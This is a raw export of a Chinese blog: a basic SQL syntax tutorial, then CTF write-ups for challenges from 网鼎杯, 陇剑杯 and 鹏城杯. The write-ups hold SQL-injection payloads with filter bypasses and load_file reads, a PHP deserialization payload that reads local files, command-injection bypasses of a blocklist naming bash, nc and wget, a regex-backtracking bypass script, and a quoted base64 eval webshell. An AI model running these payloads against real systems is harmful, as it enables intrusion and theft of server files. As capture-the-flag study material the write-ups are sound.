sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">sql</span><br><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> 表<span class="hljs-number">1</span><br><span class="hljs-keyword">UNION</span><br><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> 表<span class="hljs-number">2</span>;<br></code></pre></td></tr></table></figure><p>注意：<code>UNION</code> 会自动去除重复记录。如果你希望保留重复记录，可以使用 <code>UNION ALL</code>。</p><p>（9）连接查询</p><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lasso"><span class="hljs-keyword">SELECT</span> <span class="hljs-params">...</span> FROM tableA  <span class="hljs-keyword">JOIN</span> tableB <span class="hljs-keyword">ON</span> tableA.column1 = tableB.column2;<br></code></pre></td></tr></table></figure><p>（10）合并查询</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">SELECT</span> <span class="hljs-built_in">column_name</span>(s) <span class="hljs-keyword">FROM</span> table1<br><span class="hljs-keyword">UNION</span><br><span class="hljs-keyword">SELECT</span> <span class="hljs-built_in">column_name</span>(s) <span class="hljs-keyword">FROM</span> table2;<br></code></pre></td></tr></table></figure><p>（11）AND &amp; OR 运算符用于基于一个以上的条件对记录进行过滤。</p><p>（12）WHERE 子句用于过滤记录。</p><p>（13）ORDER BY 关键字用于对结果集进行排序。</p><p>（14）LIKE 操作符用于在 WHERE 子句中搜索列中的指定模式。</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">SELECT</span> <span class="hljs-built_in">column_name</span>(s)<br><span class="hljs-keyword">FROM</span> <span class="hljs-built_in">table_name</span><br><span class="hljs-keyword">WHERE</span> <span class="hljs-built_in">column_name</span> <span class="hljs-keyword">LIKE</span> pattern;<br></code></pre></td></tr></table></figure><p>（15）通配符可用于替代字符串中的任何其他字符。（%：替代 0 个或多个字符，_：替代一个字符）</p><p>（16）IN 操作符允许您在 WHERE 子句中规定多个值。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> column_name(s)<br><span class="hljs-keyword">FROM</span> table_name<br><span class="hljs-keyword">WHERE</span> column_name <span class="hljs-keyword">IN</span> (value1,value2,...);<br><br><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> Websites<br><span class="hljs-keyword">WHERE</span> name <span class="hljs-keyword">IN</span> (<span class="hljs-string">&#x27;Google&#x27;</span>,<span class="hljs-string">&#x27;菜鸟教程&#x27;</span>);<br></code></pre></td></tr></table></figure><p><strong>IN 与 &#x3D; 的异同</strong></p><ul><li>相同点：均在WHERE中使用作为筛选条件之一、均是等于的含义</li><li>不同点：IN可以规定多个值，等于规定一个值</li></ul><p>（17）BETWEEN 操作符用于选取介于两个值之间的数据范围内的值。</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">SELECT</span> <span class="hljs-built_in">column_name</span>(s)<br><span class="hljs-keyword">FROM</span> <span class="hljs-built_in">table_name</span><br><span class="hljs-keyword">WHERE</span> <span class="hljs-built_in">column_name</span> <span class="hljs-keyword">BETWEEN</span> value1 <span class="hljs-keyword">AND</span> value2;<br></code></pre></td></tr></table></figure><p>（18）别名</p><p>列的别名写法：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">SELECT</span> <span class="hljs-built_in">column_name</span> <span class="hljs-keyword">AS</span> alias_name<br><span class="hljs-keyword">FROM</span> <span class="hljs-built_in">table_name</span>;<br></code></pre></td></tr></table></figure><p>表的别名写法：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">SELECT</span> <span class="hljs-built_in">column_name</span>(s)<br><span class="hljs-keyword">FROM</span> <span class="hljs-built_in">table_name</span> <span class="hljs-keyword">AS</span> alias_name;<br></code></pre></td></tr></table></figure><p>（19）MySQL Date 函数</p><p><strong>MySQL</strong> 使用下列数据类型在数据库中存储日期或日期&#x2F;时间值：</p><ul><li>DATE - 格式：YYYY-MM-DD</li><li>DATETIME - 格式：YYYY-MM-DD HH:MM:SS</li><li>TIMESTAMP - 格式：YYYY-MM-DD HH:MM:SS</li><li>YEAR - 格式：YYYY 或 YY</li></ul><p>下面的表格列出了 MySQL 中最重要的内建日期函数：</p><table><thead><tr><th>函数</th><th>描述</th></tr></thead><tbody><tr><td><a href="https://www.runoob.com/sql/func-now.html">NOW()</a></td><td>返回当前的日期和时间  SELECT NOW() FROM table_name;</td></tr><tr><td><a href="https://www.runoob.com/sql/func-curdate.html">CURDATE()</a></td><td>返回当前的日期</td></tr><tr><td><a href="https://www.runoob.com/sql/func-curtime.html">CURTIME()</a></td><td>返回当前的时间</td></tr><tr><td><a href="https://www.runoob.com/sql/func-date.html">DATE()</a></td><td>提取日期或日期&#x2F;时间表达式的日期部分</td></tr><tr><td><a href="https://www.runoob.com/sql/func-extract.html">EXTRACT()</a></td><td>返回日期&#x2F;时间的单独部分</td></tr><tr><td><a href="https://www.runoob.com/sql/func-date-add.html">DATE_ADD()</a></td><td>向日期添加指定的时间间隔</td></tr><tr><td><a href="https://www.runoob.com/sql/func-date-sub.html">DATE_SUB()</a></td><td>从日期减去指定的时间间隔</td></tr><tr><td><a href="https://www.runoob.com/sql/func-datediff-mysql.html">DATEDIFF()</a></td><td>返回两个日期之间的天数</td></tr><tr><td><a href="https://www.runoob.com/sql/func-date-format.html">DATE_FORMAT()</a></td><td>用不同的格式显示日期&#x2F;时间</td></tr></tbody></table><p>10、修改数据</p><p>（1）插入数据</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">INSERT</span> INTO &lt;表名&gt; (字段<span class="hljs-number">1</span>, 字段<span class="hljs-number">2</span>, ...) VALUES (值<span class="hljs-number">1</span>, 值<span class="hljs-number">2</span>, ...);<br></code></pre></td></tr></table></figure><p>（2）更新数据</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">UPDATE &lt;表名&gt; <span class="hljs-built_in">SET</span> 字段<span class="hljs-attribute">1</span>=值1, 字段<span class="hljs-attribute">2</span>=值2  WHERE &lt;条件表达式&gt;;<br></code></pre></td></tr></table></figure><p>（3）删除数据</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">DELETE</span> <span class="hljs-keyword">FROM</span> &lt;表名&gt; <span class="hljs-keyword">WHERE</span> &lt;条件表达式&gt;;<br></code></pre></td></tr></table></figure><p>（4）插入或替换数据（插入数据，如果数据存在，先删除再插入）</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">REPLACE</span> INTO &lt;表名&gt; (字段<span class="hljs-number">1</span>, 字段<span class="hljs-number">2</span>, ...) VALUES (值<span class="hljs-number">1</span>, 值<span class="hljs-number">2</span>, ...);<br></code></pre></td></tr></table></figure><p>（5）插入或更新数据（插入数据，如果数据存在，则更新数据）</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> &lt;表名&gt;(字段<span class="hljs-number">1</span>，字段<span class="hljs-number">2</span>，...) <span class="hljs-keyword">VALUES</span> (值<span class="hljs-number">1</span>，值<span class="hljs-number">2</span>，...) <span class="hljs-keyword">ON</span> DUPLICATE <span class="hljs-keyword">KEY</span> <span class="hljs-keyword">UPDATE</span> &lt;条件表达式&gt;;<br></code></pre></td></tr></table></figure><p>（6）插入或忽略数据（插入数据，如果数据存在，则不插入）</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">INSERT</span> IGNORE INTO &lt;表名&gt;(字段<span class="hljs-number">1</span>，字段<span class="hljs-number">2</span>，...) VALUES (值<span class="hljs-number">1</span>，值<span class="hljs-number">2</span>,...);<br></code></pre></td></tr></table></figure><p>(7) 快照： INSERT INTO SELECT 语句从一个表复制数据，然后把数据插入到一个已存在的表中。</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> table2<br><span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> table1;<br></code></pre></td></tr></table></figure><p>复制部分列到另一个已存在的表中：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> table2<br>(<span class="hljs-built_in">column_name</span>(s))<br><span class="hljs-keyword">SELECT</span> <span class="hljs-built_in">column_name</span>(s)<br><span class="hljs-keyword">FROM</span> table1;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>数据库 基础知识</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>susu</title>
    <link href="/2024/10/25/susu/"/>
    <url>/2024/10/25/susu/</url>
    
    <content type="html"><![CDATA[<h3 id="网鼎杯-2020青龙组-Notes"><a href="#网鼎杯-2020青龙组-Notes" class="headerlink" title="[网鼎杯 2020青龙组]Notes"></a>[网鼎杯 2020青龙组]Notes</h3><h3 id="第一种："><a href="#第一种：" class="headerlink" title="第一种："></a>第一种：</h3><h5 id="sql注入中load-file-函数的使用"><a href="#sql注入中load-file-函数的使用" class="headerlink" title="sql注入中load_file()函数的使用"></a>sql注入中load_file()函数的使用</h5><p><img src="/2024/10/25/susu/Users\13061\AppData\Roaming\Typora\typora-user-images\image-20241028182603134.png" alt="image-20241028182603134"></p><p>前提: oad_file函数只有在满足两个条件的情况下才可以使用：</p><p>1、文件权限：chmod a+x pathtofile</p><p>2、文件大小：必须小于max_allowed_packet</p><p>3、必须指定文件完整的路径</p><p>通过robots协议下载后发现源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">UserInfo</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span> = <span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$age</span> = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$blog</span> = <span class="hljs-string">&quot;&quot;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>, <span class="hljs-variable">$age</span>, <span class="hljs-variable">$blog</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;name = <span class="hljs-variable">$name</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;age = (<span class="hljs-keyword">int</span>)<span class="hljs-variable">$age</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;blog = <span class="hljs-variable">$blog</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get</span>(<span class="hljs-params"><span class="hljs-variable">$url</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$ch</span> = <span class="hljs-title function_ invoke__">curl_init</span>();<br><br>        <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_URL, <span class="hljs-variable">$url</span>);<br>        <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>);<br>        <span class="hljs-variable">$output</span> = <span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$ch</span>);<br>        <span class="hljs-variable">$httpCode</span> = <span class="hljs-title function_ invoke__">curl_getinfo</span>(<span class="hljs-variable">$ch</span>, CURLINFO_HTTP_CODE);<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$httpCode</span> == <span class="hljs-number">404</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">404</span>;<br>        &#125;<br>        <span class="hljs-title function_ invoke__">curl_close</span>(<span class="hljs-variable">$ch</span>);<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$output</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getBlogContents</span> (<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-variable">$this</span>-&gt;blog);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">isValidBlog</span> (<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$blog</span> = <span class="hljs-variable language_">$this</span>-&gt;blog;<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i&quot;</span>, <span class="hljs-variable">$blog</span>);<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">?<span class="hljs-keyword">no</span>=<span class="hljs-number">0</span> <span class="hljs-keyword">union</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,(load_file(<span class="hljs-string">&#x27;/var/www/html/flag.php&#x27;</span>)),<span class="hljs-number">3</span>,<span class="hljs-number">4</span> <br><br>load_file(<span class="hljs-string">&#x27;/var/www/html/flag.php&#x27;</span>)`: 这个函数用于从服务器文件系统读取文件的内容。在这个例子中，它尝试读取 `flag.php` 文件的内容。<br></code></pre></td></tr></table></figure><h3 id="第二种："><a href="#第二种：" class="headerlink" title="第二种："></a>第二种：</h3><p>注册用户之后发现sql注入，union select被过滤 用union&#x2F;**&#x2F;select</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-number">1</span> <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> <span class="hljs-number">4</span> # 四个字段<br>库<br>?<span class="hljs-keyword">no</span>=<span class="hljs-number">0</span> <span class="hljs-keyword">union</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-keyword">database</span>(),<span class="hljs-number">3</span>,<span class="hljs-number">4</span> <br>表<br>?<span class="hljs-keyword">no</span>=<span class="hljs-number">0</span> <span class="hljs-keyword">union</span> <span class="hljs-comment">/*!SelEct*/</span> <span class="hljs-number">1</span>,(<span class="hljs-keyword">select</span> group_concat(<span class="hljs-string">&#x27;~&#x27;</span>,<span class="hljs-built_in">column_name</span>,<span class="hljs-string">&#x27;~&#x27;</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> table_schema = <span class="hljs-keyword">database</span>()),<span class="hljs-number">3</span>,<span class="hljs-number">4</span><br>字段<br>?<span class="hljs-keyword">no</span>=<span class="hljs-number">-1</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">union</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span><span class="hljs-number">1</span>,(<span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span>group_concat(<span class="hljs-built_in">table_name</span>) <span class="hljs-comment">/**/</span><span class="hljs-keyword">from</span><span class="hljs-comment">/**/</span>information_schema.<span class="hljs-keyword">tables</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">where</span><span class="hljs-comment">/**/</span>table_schema=<span class="hljs-keyword">database</span>()),<span class="hljs-number">3</span>,<span class="hljs-number">4</span><br>数据<br>?<span class="hljs-keyword">no</span>=<span class="hljs-number">0</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">union</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(<span class="hljs-built_in">table_name</span>),<span class="hljs-number">3</span>,<span class="hljs-number">4</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;fakebook&#x27;</span># <br><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><br>根据源码构造序列化<br><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">UserInfo</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span> = <span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$age</span> = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$blog</span> = <span class="hljs-string">&quot;&quot;</span>;<br>&#125;<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">UserInfo</span>();<br><span class="hljs-variable">$a</span>-&gt;name = <span class="hljs-string">&#x27;admin888&#x27;</span>;<br><span class="hljs-variable">$a</span>-&gt;age = <span class="hljs-number">12</span>;<br><span class="hljs-variable">$a</span>-&gt;blog = <span class="hljs-string">&#x27;file:///var/www/html/user.php&#x27;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">O</span>:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;UserInfo&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;name&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;admin888&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;age&quot;</span>;i:<span class="hljs-number">12</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;blog&quot;</span>;s:<span class="hljs-number">29</span>:<span class="hljs-string">&quot;file:///var/www/html/user.php&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><h2 id="tee-exec"><a href="#tee-exec" class="headerlink" title="tee  exec()"></a>tee  <strong>exec()</strong></h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;url&#x27;</span>]))<br>&#123;<br>    <span class="hljs-variable">$url</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;url&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/bash|nc|wget|ping|ls|cat|more|less|phpinfo|base64|echo|php|python|mv|cp|la|\-|\*|\&quot;|\&gt;|\&lt;|\%|\$/i&#x27;</span>,<span class="hljs-variable">$url</span>))<br>    &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Sorry,you can&#x27;t use this.&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Can you see anything?&quot;</span>;<br>        <span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-variable">$url</span>);<br>    &#125;<br>&#125; <br></code></pre></td></tr></table></figure><blockquote><p>|管道输出符  将前一个命令的输出传递给 <code>tee</code> 命令。</p><p>tee命令用于读取标准输入的数据，并将其内容输出成文件。</p><p>tee指令会从标准输入设备读取数据，将其内容输出到标准输出设备，同时保存成文件。</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">/?url=l\s / |tee <span class="hljs-number">1</span>.txt<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cobol">/?url=tac /flllll\aaaaaaggggggg |tee 2.txt<br></code></pre></td></tr></table></figure><h2 id="正则匹配回溯绕过"><a href="#正则匹配回溯绕过" class="headerlink" title="正则匹配回溯绕过"></a><strong>正则匹配回溯绕过</strong></h2><p>这样匹配就实现了回溯，<strong>这里回溯有一个回溯限制次数——100 万次</strong></p><p> <strong>当回溯超出这个次数，还没吐完的字符串就可以逃逸匹配</strong></p><p>利用这个特性我们可以逃逸我们想要的语句，只要在我们的语句后加上100万个字符即可</p><p>等匹配超过这个次数时我们的语句自然就可以逃逸掉了</p><p>payload:</p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs haskell"><span class="hljs-keyword">import</span> requests<br><span class="hljs-title">url</span> = &#x27;http://<span class="hljs-number">1.14</span>.<span class="hljs-number">71.254</span>:<span class="hljs-number">28288</span>/&#x27;<br><span class="hljs-title">payload</span> = &#x27;&#123;<span class="hljs-string">&quot;cmd&quot;</span>:<span class="hljs-string">&quot;?&gt;&lt;?=`sort /f*`?&gt;&quot;</span>,<span class="hljs-string">&quot;+&quot;</span>:<span class="hljs-string">&quot;&#x27; + &quot;</span>-<span class="hljs-string">&quot; * 1000000 + &#x27;&quot;</span>&#125;&#x27;<br><span class="hljs-title">res</span> = requests.post(url=url, <span class="hljs-class"><span class="hljs-keyword">data</span>=&#123;&quot;<span class="hljs-title">letter</span>&quot;: <span class="hljs-title">payload</span>&#125;)</span><br><span class="hljs-title">print</span>(res.text)<br></code></pre></td></tr></table></figure><h1 id="NSSCTF-陇剑杯-2021-webshell-问-1-7"><a href="#NSSCTF-陇剑杯-2021-webshell-问-1-7" class="headerlink" title="NSSCTF[陇剑杯 2021]webshell 问(1~7)"></a>NSSCTF[陇剑杯 2021]webshell 问(1~7)</h1><p>查看登录系统使用的密码是_____________</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-keyword">http</span> <span class="hljs-keyword">contains</span> <span class="hljs-string">&quot;password&quot;</span> 查看HTTP中有password的流量包<br></code></pre></td></tr></table></figure><p>(2)修改了一个日志文件，文件的绝对路径为_____________</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-keyword">http</span> <span class="hljs-keyword">contains</span> <span class="hljs-string">&quot;.log&quot;</span>查看HTTP中有.<span class="hljs-built_in">log</span>的流量包.<br></code></pre></td></tr></table></figure><p>在流量包中发现data&#x2F;Runtime&#x2F;Logs&#x2F;Home&#x2F;21_08_07.log 日志文件</p><p>后续流量包，其中存在命令执行pwd，查看http流，可以准确的得到网站目录为&#x2F;var&#x2F;www&#x2F;html </p><p>(3)http contains “whoami”查看http协议中包含whoami（查看当前用户的命令）的流量包</p><p>在317发现whoami但是在319有响应</p><p>(4)黑客写入的webshell文件名是_____________。(请提交带有文件后缀的文件名，例如x.txt)</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css">上传webshell基本使用POST方法提交，然后再<span class="hljs-number">337</span>个包发现<span class="hljs-number">1</span><span class="hljs-selector-class">.php</span>经过分析确定为黑客写入的webshell<br>base <span class="hljs-number">64</span>编码了，其实搜索echo也可以<br>Value: <span class="hljs-built_in">system</span>(<span class="hljs-string">&#x27;echo PD9waHAgZXZhbCgkX1JFUVVFU1RbYWFhXSk7Pz4=|base64 -d &gt; /var/www/html/1.php&#x27;</span>);<br></code></pre></td></tr></table></figure><p>(5)问五：单位网站被黑客挂马，请您从流量中分析出webshell，进行回答： 黑客上传的代理工具客户端名字是_____________。</p><p>http contains “1.php”过滤http协议中包含的1.php，右击数据包查看http流，直接查看黑客进行的操作进行分析,通过分析发现345流量包对比341流量包回显的数据中多了一个frpc.ini文件，猜测该文件为黑客上传的代理工具</p><p><a href="https://blog.csdn.net/2301_76690905/article/details/135037053">https://blog.csdn.net/2301_76690905/article/details/135037053</a></p><h1 id="鹏城杯-2022-简单包含"><a href="#鹏城杯-2022-简单包含" class="headerlink" title="[鹏城杯 2022]简单包含"></a>[鹏城杯 2022]简单包含</h1><p>题目页面给了一条flag路径，先试着POST传参进去，使用php为协议，但是发现提示有waf，先看看index.php看看条件base64解码后得到php代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$path</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;flag&quot;</span>];<br><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;php://input&#x27;</span>)) &lt; <span class="hljs-number">800</span> &amp;&amp; <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/flag/&#x27;</span>, <span class="hljs-variable">$path</span>)) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;nssctf waf!&#x27;</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    @<span class="hljs-keyword">include</span>(<span class="hljs-variable">$path</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br>    